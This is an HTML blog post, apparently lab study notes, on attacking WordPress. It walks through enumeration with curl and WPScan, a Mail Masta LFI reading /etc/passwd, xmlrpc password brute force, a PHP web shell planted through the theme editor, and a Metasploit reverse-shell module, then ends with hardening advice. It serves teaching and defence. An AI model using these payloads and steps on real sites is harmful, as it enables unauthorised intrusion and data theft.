@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- Google Analytics (gtag.js) - counts your visitors -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-V2R1YY0P62"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-V2R1YY0P62');
+  </script>
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Hacking WordPress · Aymane Elouafi</title>
+  <meta name="description" content="Enumerating WordPress (core version, plugins, themes, users), WPScan, exploiting a vulnerable plugin (Mail Masta LFI), brute-forcing logins, and RCE via the theme editor and Metasploit.">
+  <meta name="author" content="Aymane Elouafi">
+  <meta name="robots" content="index, follow, max-image-preview:large">
+  <meta name="google-site-verification" content="P6WC3YGSehH9r2o-Lon_-tKZGpFiOWJjHD41vtJqLsk">
+  <link rel="canonical" href="https://aymaneelouafi.me/wordpress.html">
+  <link rel="icon" href="/favicon.ico" sizes="48x48">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <link rel="icon" href="/favicon-512.png" type="image/png" sizes="512x512">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+  <!-- Open Graph (Facebook, LinkedIn, Discord...) -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Hacking WordPress · Aymane Elouafi">
+  <meta property="og:description" content="Enumerating WordPress (core version, plugins, themes, users), WPScan, exploiting a vulnerable plugin (Mail Masta LFI), brute-forcing logins, and RCE via the theme editor and Metasploit.">
+  <meta property="og:url" content="https://aymaneelouafi.me/wordpress.html">
+  <meta property="og:site_name" content="Aymane Elouafi">
+  <meta property="og:image" content="https://aymaneelouafi.me/images/og.png">
+
+  <!-- Twitter / X -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Hacking WordPress · Aymane Elouafi">
+  <meta name="twitter:description" content="Enumerating WordPress (core version, plugins, themes, users), WPScan, exploiting a vulnerable plugin (Mail Masta LFI), brute-forcing logins, and RCE via the theme editor and Metasploit.">
+  <meta name="twitter:image" content="https://aymaneelouafi.me/images/og.png">
+
+  <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "BlogPosting",
+      "headline": "Hacking WordPress",
+      "description": "Enumerating WordPress (core version, plugins, themes, users), WPScan, exploiting a vulnerable plugin (Mail Masta LFI), brute-forcing logins, and RCE via the theme editor and Metasploit.",
+      "datePublished": "2026-11-01",
+      "dateModified": "2026-11-01",
+      "author": {
+        "@type": "Person",
+        "name": "Aymane Elouafi",
+        "@id": "https://aymaneelouafi.me/#person",
+        "url": "https://aymaneelouafi.me"
+      },
+      "publisher": {
+        "@type": "Person",
+        "name": "Aymane Elouafi",
+        "url": "https://aymaneelouafi.me"
+      },
+      "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://aymaneelouafi.me/wordpress.html"
+      },
+      "url": "https://aymaneelouafi.me/wordpress.html",
+      "image": "https://aymaneelouafi.me/images/og.png",
+      "keywords": "htb, web, wordpress, cms, wpscan, lfi, rce, enumeration",
+      "articleSection": "Web Attacks",
+      "inLanguage": "en"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Aymane Elouafi",
+          "item": "https://aymaneelouafi.me/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Web Attacks"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "Hacking WordPress",
+          "item": "https://aymaneelouafi.me/wordpress.html"
+        }
+      ]
+    }
+  ]
+}
+  </script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/style.css?v=1793561448196">
+  <script defer src="/menu.js?v=1793561448196"></script>
+</head>
+<body>
+  <div class="topbar">
+    <button class="menu-toggle" aria-label="Open menu" aria-expanded="false">☰ menu</button>
+    <a class="topbar-home" href="/">~/aymane</a>
+  </div>
+  <div class="backdrop" id="backdrop"></div>
+  <aside class="sidebar" id="sidebar">
+    <div class="sidebar-inner">
+      <p class="sidebar-title">// methodology &amp; notes</p>
+    <details class="nav-phase" open>
+      <summary><span class="nav-num">1</span> Information Gathering</summary>
+        <div class="nav-section">
+          <span class="nav-sec-title">Host Discovery &amp; Port Scanning</span>
+          <ul>
+            <li><a href="nmap.html">Network Enumeration with Nmap</a></li>
+          </ul>
+        </div>
+        <div class="nav-section">
+          <span class="nav-sec-title">Service Enumeration / Footprinting</span>
+          <ul>
+            <li><a href="nfs.html">Footprinting NFS</a></li>
+            <li><a href="ftp.html">Footprinting FTP</a></li>
+            <li><a href="dns.html">Footprinting DNS</a></li>
+            <li><a href="smtp.html">Footprinting SMTP</a></li>
+            <li><a href="imap-pop3.html">Footprinting IMAP / POP3</a></li>
+            <li><a href="snmp.html">Footprinting SNMP</a></li>
+            <li><a href="mysql.html">Footprinting MySQL</a></li>
+            <li><a href="mssql.html">Footprinting MSSQL</a></li>
+            <li><a href="oracle-tns.html">Footprinting Oracle TNS</a></li>
+            <li><a href="ipmi.html">Footprinting IPMI</a></li>
+          </ul>
+        </div>
+        <div class="nav-section empty"><span class="nav-sec-title">Web Recon</span></div>
+    </details>
+    <details class="nav-phase">
+      <summary><span class="nav-num">2</span> Vulnerability Assessment</summary>
+        <div class="nav-section empty"><span class="nav-sec-title">Known Vulnerabilities (version → CVE)</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">Web Vulnerabilities</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">Misconfigurations &amp; Default Credentials</span></div>
+    </details>
+    <details class="nav-phase" open>
+      <summary><span class="nav-num">3</span> Exploitation</summary>
+        <div class="nav-section empty"><span class="nav-sec-title">Service / Network Exploitation</span></div>
+        <div class="nav-section">
+          <span class="nav-sec-title">Web Exploitation</span>
+          <ul>
+            <li><a href="wordpress.html" class="current">Hacking WordPress</a></li>
+          </ul>
+        </div>
+        <div class="nav-section empty"><span class="nav-sec-title">Password Attacks</span></div>
+    </details>
+    <details class="nav-phase">
+      <summary><span class="nav-num">4</span> Post-Exploitation</summary>
+        <div class="nav-section empty"><span class="nav-sec-title">Local Enumeration</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">Privilege Escalation (Linux / Windows)</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">Looting &amp; Credential Hunting</span></div>
+    </details>
+    <details class="nav-phase">
+      <summary><span class="nav-num">5</span> Lateral Movement</summary>
+        <div class="nav-section empty"><span class="nav-sec-title">Pivoting &amp; Tunneling</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">Credential Reuse &amp; Pass-the-Hash</span></div>
+    </details>
+    <details class="nav-phase">
+      <summary><span class="nav-num">6</span> Active Directory</summary>
+        <div class="nav-section empty"><span class="nav-sec-title">AD Enumeration</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">AD Attacks</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">Domain Dominance &amp; Lateral Movement</span></div>
+    </details>
+    <details class="nav-phase nav-walk">
+      <summary><span class="nav-num">★</span> HTB Walkthroughs</summary>
+      <div class="nav-section">
+        <ul>
+          <li><a href="cap.html">Cap - HTB Walkthrough</a></li>
+        </ul>
+      </div>
+    </details>
+    </div>
+  </aside>
+  <main class="container post">
+
+    <a class="back" href="/">← cd ..</a>
+
+    <span class="series-label">Web Attacks</span>
+    <h1>Hacking WordPress</h1>
+    <p class="post-meta">2026-11-01 · #htb #web #wordpress #cms #wpscan #lfi #rce #enumeration</p>
+
+    <input id="post-search" class="search post-search" type="text"
+           placeholder="search in this post...  (Enter = next, Shift+Enter = previous, Esc = clear)"
+           autocomplete="off">
+    <p id="post-search-count" class="search-count" hidden></p>
+
+  <details class="cheatsheet">
+    <summary><span class="arrow">&#9656;</span> Cheat sheet &mdash; useful commands</summary>
+    <div class="cheat-body">
+      <div class="cheat-row">
+        <code>curl -s http://&lt;target&gt; | grep '&lt;meta name="generator"'</code>
+        <span>Identify the WordPress core version</span>
+      </div>
+      <div class="cheat-row">
+        <code>curl http://&lt;target&gt;/wp-json/wp/v2/users | jq</code>
+        <span>Enumerate users via the REST API</span>
+      </div>
+      <div class="cheat-row">
+        <code>curl -s -I 'http://&lt;target&gt;/?author=1'</code>
+        <span>Enumerate a user by author ID</span>
+      </div>
+      <div class="cheat-row">
+        <code>wpscan --url http://&lt;target&gt; --enumerate --api-token &lt;TOKEN&gt;</code>
+        <span>Full scan: version, plugins, themes, users, vulns</span>
+      </div>
+      <div class="cheat-row">
+        <code>wpscan --password-attack xmlrpc -U &lt;users&gt; -P &lt;wordlist&gt; --url http://&lt;target&gt;</code>
+        <span>Brute force logins (fast, via xmlrpc)</span>
+      </div>
+      <div class="cheat-row">
+        <code>msf&gt; use exploit/unix/webapp/wp_admin_shell_upload</code>
+        <span>Admin creds → reverse shell</span>
+      </div>
+      <div class="cheat-row">
+        <code>Theme Editor → 404.php → &lt;?php system($_GET['cmd']); ?&gt;</code>
+        <span>Manual RCE as admin</span>
+      </div>
+    </div>
+  </details>
+
+
+
+    <article id="content">
+<h2>WordPress Overview</h2>
+<ul>
+<li><strong>WordPress</strong> = the most popular open-source <strong>CMS (Content Management System)</strong> — powers nearly <strong>one-third of all websites</strong> in the world.</li>
+<li>Used for many purposes: blogs, forums, e-commerce, project management, document management, and more.</li>
+<li>Popular with companies because it&#39;s <strong>highly customizable</strong> and <strong>SEO-friendly</strong>.</li>
+<li>Has a huge library of <strong>extensions</strong> — free and paid:<ul>
+<li><strong>Themes</strong> = control design/appearance.</li>
+<li><strong>Plugins</strong> = add functionality. Examples: <strong>WPForms</strong> (contact forms), <strong>MonsterInsights</strong> (Google Analytics integration), <strong>Constant Contact</strong> (email marketing).</li>
+</ul>
+</li>
+<li><strong>The security catch:</strong> that same customizability/extensibility makes it <strong>prone to vulnerabilities</strong> — mostly through <strong>third-party themes and plugins</strong>.</li>
+<li><strong>Tech stack:</strong> written in <strong>PHP</strong>, usually runs on <strong>Apache</strong>, with <strong>MySQL</strong> as the backend database.</li>
+<li>Many hosting companies offer WordPress as a one-click option and even handle backend tasks like security updates.</li>
+</ul>
+<p><strong>What is a CMS?</strong></p>
+<ul>
+<li>A tool to build a website <strong>without coding everything from scratch</strong> (or knowing how to code at all).</li>
+<li>Does the &quot;heavy lifting&quot; on the infrastructure side → you focus on <strong>design and content</strong> instead of backend plumbing.</li>
+<li>Most provide a <strong>WYSIWYG editor</strong> (&quot;What You See Is What You Get&quot;) — edit content like you would in Microsoft Word.</li>
+<li>Media (photos/videos) uploaded through a <strong>media library interface</strong>, instead of manually via FTP/SFTP.</li>
+</ul>
+<p><strong>The 2 key components of a CMS</strong></p>
+<ul>
+<li><strong>CMA (Content Management Application)</strong> = the <strong>front-facing interface</strong> where users add/manage content.</li>
+<li><strong>CDA (Content Delivery Application)</strong> = the <strong>backend</strong> that takes CMA input and assembles it into the finished, working website.</li>
+</ul>
+<h2>WordPress Structure</h2>
+<h3>Default WordPress File Structure</h3>
+<p>WordPress can be installed on a Windows, Linux, or Mac OSX host. We will focus on a default WordPress installation on an Ubuntu Linux web server. WordPress requires a fully installed and configured LAMP stack (Linux, Apache HTTP Server, MySQL database, and PHP) before installation on a Linux host. After installation, all WordPress supporting files and directories will be accessible in the webroot located at <code>/var/www/html</code>.</p>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ tree -L 1 /var/www/html
+.
+├── index.php
+├── license.txt
+├── readme.html
+├── wp-activate.php
+├── wp-admin
+├── wp-blog-header.php
+├── wp-comments-post.php
+├── wp-config.php
+├── wp-config-sample.php
+├── wp-content
+├── wp-cron.php
+├── wp-includes
+├── wp-links-opml.php
+├── wp-load.php
+├── wp-login.php
+├── wp-mail.php
+├── wp-settings.php
+├── wp-signup.php
+├── wp-trackback.php
+└── xmlrpc.php
+</code></pre>
+<h3>Key WordPress Files</h3>
+<p>The root directory of WordPress contains files that are needed to configure WordPress to function correctly.</p>
+<ul>
+<li><code>index.php</code> is the homepage of WordPress.</li>
+<li><code>license.txt</code> contains useful information such as the version WordPress installed.</li>
+<li><code>wp-activate.php</code> is used for the email activation process when setting up a new WordPress site.</li>
+<li><code>wp-admin</code> folder contains the login page for administrator access and the backend dashboard. The login page can be located at one of the following paths:<ul>
+<li><code>/wp-admin/login.php</code></li>
+<li><code>/wp-admin/wp-login.php</code></li>
+<li><code>/login.php</code></li>
+<li><code>/wp-login.php</code></li>
+</ul>
+</li>
+<li><code>xmlrpc.php</code> is a file representing a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress <a href="https://developer.wordpress.org/rest-api/reference">REST API</a>.</li>
+</ul>
+<h3>WordPress Configuration File</h3>
+<p>The <code>wp-config.php</code> file contains information required by WordPress to connect to the database, such as the database name, host, username and password, authentication keys and salts, and the database table prefix. It can also be used to activate DEBUG mode.</p>
+<pre><code class="language-php">&lt;?php
+/** &lt;SNIP&gt; */
+/** The name of the database for WordPress */
+define( &#39;DB_NAME&#39;, &#39;database_name_here&#39; );
+
+/** MySQL database username */
+define( &#39;DB_USER&#39;, &#39;username_here&#39; );
+
+/** MySQL database password */
+define( &#39;DB_PASSWORD&#39;, &#39;password_here&#39; );
+
+/** MySQL hostname */
+define( &#39;DB_HOST&#39;, &#39;localhost&#39; );
+
+/** Authentication Unique Keys and Salts */
+/* &lt;SNIP&gt; */
+define( &#39;AUTH_KEY&#39;,         &#39;put your unique phrase here&#39; );
+define( &#39;SECURE_AUTH_KEY&#39;,  &#39;put your unique phrase here&#39; );
+define( &#39;LOGGED_IN_KEY&#39;,    &#39;put your unique phrase here&#39; );
+define( &#39;NONCE_KEY&#39;,        &#39;put your unique phrase here&#39; );
+
+/** WordPress Database Table prefix */
+$table_prefix = &#39;wp_&#39;;
+
+/** For developers: WordPress debugging mode. */
+define( &#39;WP_DEBUG&#39;, false );
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( &#39;ABSPATH&#39; ) ) {
+    define( &#39;ABSPATH&#39;, __DIR__ . &#39;/&#39; );
+}
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . &#39;wp-settings.php&#39;;
+</code></pre>
+<h3>Key WordPress Directories</h3>
+<p>The <code>wp-content</code> folder is the main directory where plugins and themes are stored. The subdirectory <code>uploads/</code> is usually where any files uploaded to the platform are stored. These should be carefully enumerated as they may contain sensitive data that could lead to remote code execution or exploitation of other vulnerabilities.</p>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ tree -L 1 /var/www/html/wp-content
+.
+├── index.php
+├── plugins
+└── themes
+</code></pre>
+<p><code>wp-includes</code> contains everything except for the administrative components and the themes. This is where core files are stored, such as certificates, fonts, JavaScript files, and widgets.</p>
+<h2>WordPress User Roles</h2>
+<p>There are five types of users in a standard WordPress installation.</p>
+<table>
+<thead>
+<tr>
+<th>Role</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Administrator</td>
+<td>Access to administrative features: adding/deleting users and posts, as well as editing source code.</td>
+</tr>
+<tr>
+<td>Editor</td>
+<td>Can publish and manage posts, including the posts of other users.</td>
+</tr>
+<tr>
+<td>Author</td>
+<td>Can publish and manage their own posts.</td>
+</tr>
+<tr>
+<td>Contributor</td>
+<td>Can write and manage their own posts but cannot publish them.</td>
+</tr>
+<tr>
+<td>Subscriber</td>
+<td>Normal users who can browse posts and edit their profiles.</td>
+</tr>
+</tbody></table>
+<p>Gaining access as an administrator is usually needed to obtain code execution on the server. However, editors and authors might have access to certain vulnerable plugins that normal users do not.</p>
+<h2>WordPress Core Version Enumeration</h2>
+<p>The first and easiest step is reviewing the page source code (<code>CTRL + U</code>). We can search for the <code>meta generator</code> tag, or use <code>cURL</code> with <code>grep</code> from the command line.</p>
+<pre><code class="language-html">&lt;meta name=&quot;generator&quot; content=&quot;WordPress 5.3.3&quot; /&gt;
+</code></pre>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com | grep &#39;&lt;meta name=&quot;generator&quot;&#39;
+
+&lt;meta name=&quot;generator&quot; content=&quot;WordPress 5.3.3&quot; /&gt;
+</code></pre>
+<p>Links to CSS and JS files can also leak the version via the <code>?ver=</code> query string:</p>
+<pre><code class="language-html">&lt;link rel=&#39;stylesheet&#39; id=&#39;bootstrap-css&#39; href=&#39;http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3&#39; type=&#39;text/css&#39; media=&#39;all&#39; /&gt;
+&lt;script type=&#39;text/javascript&#39; src=&#39;http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3&#39;&gt;&lt;/script&gt;
+</code></pre>
+<p>In older WordPress versions, another source for version information is the <code>readme.html</code> file in the root directory.</p>
+<h2>Plugins and Themes Enumeration</h2>
+<p>We can find installed plugins and themes by filtering the source with <code>cURL</code>:</p>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com | sed &#39;s/href=/\n/g&#39; | sed &#39;s/src=/\n/g&#39; | grep &#39;wp-content/plugins/*&#39; | cut -d&quot;&#39;&quot; -f2
+
+http://blog.inlanefreight.com/wp-content/plugins/wp-google-places-review-slider/public/css/wprev-public_combine.css?ver=6.1
+http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3
+http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.3.3
+</code></pre>
+<p>Not all plugins/themes can be discovered passively. For the rest, we actively request a path that may exist. If it exists we get a <code>301</code> redirect; if not, a <code>404 Not Found</code>.</p>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta
+
+HTTP/1.1 301 Moved Permanently
+Server: Apache/2.4.29 (Ubuntu)
+Location: http://blog.inlanefreight.com/wp-content/plugins/mail-masta/
+</code></pre>
+<p>To speed up enumeration, we could use a tool such as <code>wfuzz</code> or <code>WPScan</code> to automate the process.</p>
+<h2>Directory Indexing</h2>
+<p>Even if a plugin is deactivated, it may still be accessible, so we can reach its scripts and functions. Deactivating a vulnerable plugin does <strong>not</strong> improve security — it is best practice to remove or update unused plugins.</p>
+<p><a href="images/wordpress/plugin-deactivated3.png" target="_blank" rel="noopener"><img src="images/wordpress/plugin-deactivated3.png" alt="WordPress plugins list showing Mail Masta (deactivated) and Photo Gallery"></a></p>
+<p>If we browse to the plugins directory, we still have access to the <code>Mail Masta</code> plugin:</p>
+<p><a href="images/wordpress/plugin-mailmasta2.png" target="_blank" rel="noopener"><img src="images/wordpress/plugin-mailmasta2.png" alt="Directory listing of /wp-content/plugins/mail-masta"></a></p>
+<p>We can also view the directory listing with cURL and <code>html2text</code>:</p>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text
+
+****** Index of /wp-content/plugins/mail-masta ******
+[[ICO]]       Name                 Last_modified    Size Description
+===========================================================================
+[[PARENTDIR]] Parent_Directory                         -
+[[DIR]]       amazon_api/          2020-05-13 18:01    -
+[[DIR]]       inc/                 2020-05-13 18:01    -
+[[DIR]]       lib/                 2020-05-13 18:01    -
+[[   ]]       plugin-interface.php 2020-05-13 18:01  88K
+[[TXT]]       readme.txt           2020-05-13 18:01 2.2K
+===========================================================================
+     Apache/2.4.29 (Ubuntu) Server at blog.inlanefreight.com Port 80
+</code></pre>
+<p>This is called <strong>Directory Indexing</strong> — it lets us navigate folders and access files that may contain sensitive information or vulnerable code. It should be disabled on web servers.</p>
+<h2>User Enumeration</h2>
+<p>A list of valid users lets us guess default credentials or brute-force passwords. There are two manual methods.</p>
+<h3>First Method — author ID</h3>
+<p>The <code>admin</code> user is usually assigned user ID <code>1</code>. We can confirm this by specifying the user ID in the <code>author</code> parameter: <code>http://blog.inlanefreight.com/?author=1</code>. If the user exists, the <code>Location</code> header redirects to their profile; if not, we get a <code>404</code>.</p>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ curl -s -I http://blog.inlanefreight.com/?author=1
+
+HTTP/1.1 301 Moved Permanently
+Server: Apache/2.4.29 (Ubuntu)
+X-Redirect-By: WordPress
+Location: http://blog.inlanefreight.com/index.php/author/admin/
+</code></pre>
+<h3>Second Method — JSON endpoint</h3>
+<p>The REST API <code>users</code> endpoint can list users. After WordPress 4.7.1 it only shows whether a user is configured; before that, all users who had published a post were shown by default.</p>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
+
+[
+  {
+    &quot;id&quot;: 1,
+    &quot;name&quot;: &quot;admin&quot;,
+    &quot;link&quot;: &quot;http://blog.inlanefreight.com/index.php/author/admin/&quot;,
+    &lt;SNIP&gt;
+  },
+  {
+    &quot;id&quot;: 2,
+    &quot;name&quot;: &quot;ch4p&quot;,
+    &quot;link&quot;: &quot;http://blog.inlanefreight.com/index.php/author/ch4p/&quot;,
+    &lt;SNIP&gt;
+  },
+&lt;SNIP&gt;
+</code></pre>
+<h2>Login / xmlrpc</h2>
+<p>Once we have a user list, we can brute-force passwords via the login page or <code>xmlrpc.php</code>. A valid <code>xmlrpc</code> POST returns an <code>isAdmin</code> struct; invalid credentials return a <code>403 faultCode</code>.</p>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ curl -X POST -d &quot;&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;admin&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;CORRECT-PASSWORD&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;&quot; http://blog.inlanefreight.com/xmlrpc.php
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;methodResponse&gt;
+  &lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;
+  &lt;value&gt;&lt;struct&gt;
+  &lt;member&gt;&lt;name&gt;isAdmin&lt;/name&gt;&lt;value&gt;&lt;boolean&gt;1&lt;/boolean&gt;&lt;/value&gt;&lt;/member&gt;
+  &lt;member&gt;&lt;name&gt;blogName&lt;/name&gt;&lt;value&gt;&lt;string&gt;Inlanefreight&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
+&lt;/struct&gt;&lt;/value&gt;
+&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;
+&lt;/methodResponse&gt;
+</code></pre>
+<h2>WPScan</h2>
+<p><a href="https://github.com/wpscanteam/wpscan">WPScan</a> is an automated WordPress scanner and enumeration tool. It determines if themes and plugins are outdated or vulnerable. It is installed by default on Parrot OS, or via <code>gem install wpscan</code>. You can feed it an API token from WPVulnDB (free plan: 50 requests/day) with <code>--api-token</code> to pull in vulnerability data.</p>
+<p>The <code>--enumerate</code> flag enumerates components (plugins <code>ap</code>, themes, users, etc.).</p>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ wpscan --url http://blog.inlanefreight.com --enumerate --api-token &lt;TOKEN&gt;
+
+[+] WordPress version 5.3.2 identified (Latest, released on 2019-12-18).
+[+] WordPress theme in use: twentytwenty
+
+[+] Enumerating Vulnerable Plugins (via Passive Methods)
+[+] mail-masta
+| [!] 2 vulnerabilities identified:
+| [!] Title: Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI)
+|      - https://www.exploit-db.com/exploits/40290/
+| [!] Title: Mail Masta 1.0 - Multiple SQL Injection
+|      - https://wpvulndb.com/vulnerabilities/8740
+[+] wp-google-places-review-slider
+| [!] Title: WP Google Review Slider &lt;= 6.1 - Authenticated SQL Injection
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+[+] admin
+[+] david
+[+] roger
+</code></pre>
+<h2>Exploiting a Vulnerable Plugin (LFI)</h2>
+<p>WPScan flagged <code>Mail Masta 1.0</code> as vulnerable to LFI. The <a href="https://www.exploit-db.com/exploits/40290/">exploit</a> states any unauthenticated user can read local files through <code>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</code>.</p>
+<p><a href="images/wordpress/WP_lfi.png" target="_blank" rel="noopener"><img src="images/wordpress/WP_lfi.png" alt="/etc/passwd leaked through the Mail Masta LFI"></a></p>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+&lt;SNIP&gt;
+</code></pre>
+<h2>Attacking WordPress Users — brute force</h2>
+<p>WPScan can brute-force the login via <code>wp-login</code> or <code>xmlrpc</code>. The <code>xmlrpc</code> method is preferred as it is faster.</p>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ wpscan --password-attack xmlrpc -t 20 -U admin,david -P passwords.txt --url http://blog.inlanefreight.com
+
+[+] Performing password attack on Xmlrpc against 3 user/s
+[SUCCESS] - admin / sunshine1
+
+[i] Valid Combinations Found:
+ | Username: admin, Password: sunshine1
+</code></pre>
+<h2>RCE via the Theme Editor</h2>
+<p>With administrative access, we can modify PHP source to execute system commands. Log in, go to <strong>Appearance → Theme Editor</strong>, and pick an <strong>inactive</strong> theme (to avoid corrupting the live one).</p>
+<p><a href="images/wordpress/Theme-Editor.png" target="_blank" rel="noopener"><img src="images/wordpress/Theme-Editor.png" alt="WordPress Theme Editor"></a></p>
+<p>The active theme is <code>Transportex</code>, so we edit an unused one such as <code>Twenty Seventeen</code>:</p>
+<p><a href="images/wordpress/Twenty-Seventeen.png" target="_blank" rel="noopener"><img src="images/wordpress/Twenty-Seventeen.png" alt="Selecting the Twenty Seventeen theme"></a></p>
+<p>Choose a non-critical file such as <code>404.php</code> and add a web shell:</p>
+<pre><code class="language-php">&lt;?php
+
+system($_GET[&#39;cmd&#39;]);
+
+/**
+ * The template for displaying 404 pages (not found)
+&lt;SNIP&gt;
+</code></pre>
+<p>Now we can execute commands via the <code>cmd</code> GET parameter:</p>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ curl -X GET &quot;http://&lt;target&gt;/wp-content/themes/twentyseventeen/404.php?cmd=id&quot;
+
+uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)
+</code></pre>
+<h2>Attacking WordPress with Metasploit</h2>
+<p>With valid admin credentials, the <code>wp_admin_shell_upload</code> module gives a reverse shell automatically.</p>
+<pre><code class="language-shell">msf5 &gt; use exploit/unix/webapp/wp_admin_shell_upload
+msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set rhosts blog.inlanefreight.com
+msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set username admin
+msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set password Winter2020
+msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; set lhost 10.10.16.8
+msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; run
+
+[+] Authenticated with WordPress
+[*] Uploading payload...
+[*] Meterpreter session 1 opened
+
+meterpreter &gt; getuid
+Server username: www-data (33)
+</code></pre>
+<h2>WordPress Hardening</h2>
+<p>Best practices for preventing attacks against a WordPress site:</p>
+<h3>Perform Regular Updates</h3>
+<p>Keep WordPress core, plugins and themes up to date — most flaws are in third-party plugins. You can enable automatic updates in <code>wp-config.php</code>:</p>
+<pre><code class="language-php">define( &#39;WP_AUTO_UPDATE_CORE&#39;, true );
+add_filter( &#39;auto_update_plugin&#39;, &#39;__return_true&#39; );
+add_filter( &#39;auto_update_theme&#39;, &#39;__return_true&#39; );
+</code></pre>
+<h3>Plugin and Theme Management</h3>
+<p>Only install trusted themes/plugins from WordPress.org. Check reviews, install count and last-update date. Routinely audit and remove any unused themes and plugins.</p>
+<h3>Enhance WordPress Security</h3>
+<p>Several security plugins act as a WAF, malware scanner, activity auditor and brute-force protector:</p>
+<ul>
+<li><strong>Sucuri Security</strong> — security activity auditing, file integrity monitoring, remote malware scanning, blacklist monitoring.</li>
+<li><strong>iThemes Security</strong> — 2FA, security keys/salts, Google reCAPTCHA, user action logging.</li>
+<li><strong>Wordfence Security</strong> — endpoint firewall + malware scanner; premium adds real-time rules and IP blacklisting.</li>
+</ul>
+<h3>User Management</h3>
+<ul>
+<li>Disable the standard <code>admin</code> user; create accounts with hard-to-guess usernames.</li>
+<li>Enforce strong passwords and 2FA for all users.</li>
+<li>Restrict access based on least privilege, and periodically audit user rights.</li>
+</ul>
+<h3>Configuration Management</h3>
+<ul>
+<li>Install a plugin that disallows user enumeration.</li>
+<li>Limit login attempts to prevent brute-forcing.</li>
+<li>Rename or relocate the <code>wp-login.php</code> page, or restrict it to certain IPs.</li>
+</ul>
+
+    </article>
+
+  <nav class="series">
+    <p class="prompt">$ ls ~/series/web-attacks</p>
+    <ul>
+      <li class="current">Hacking WordPress &lt;- you are here</li>
+    </ul>
+  </nav>
+
+  </main>
+
+  <script src="/post.js?v=1793561448196"></script>
+</body>
+</html>
